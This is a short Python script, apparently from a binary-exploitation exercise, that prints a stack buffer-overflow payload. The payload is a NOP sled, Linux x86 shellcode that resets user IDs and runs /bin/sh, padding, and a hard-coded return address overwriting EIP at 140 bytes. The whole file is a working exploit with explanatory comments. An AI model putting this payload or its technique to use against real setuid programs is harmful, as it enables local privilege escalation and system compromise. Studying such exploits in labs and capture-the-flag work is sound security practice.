from __future__ import print_function

def main():
    # EIP is always 140 bytes after the start of our buffer
    # So we have 140 bytes of space for shellcode
    shellcode = "\x31\xC0\xB0\xC9\xCD\x80\x89\xC3\x89\xC1\x31\xC0\xB0\xCB\xCD\x80\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\x31\xC9\x31\xD2\xCD\x80"

    # NOP sled
    # Since we are pushing "/bin//sh\x00" onto the stack,
    # we need to give 9 bytes of extra NOPs before the return address
    # so shellcode is not overwritten
    payload = "\x90" * (140 - len(shellcode) - 0x9)

    # Add shellcode after NOP sled
    payload += shellcode

    # Give the extra 9 bytes of NOPs for "/bin//sh\x00"
    payload += "\x90" * 0x9
    
    # Now we are 140 bytes after our buffer, so return into our shellcode
    payload += "\x10\xd5\xff\xff"
    
    print(payload, end="")

main()
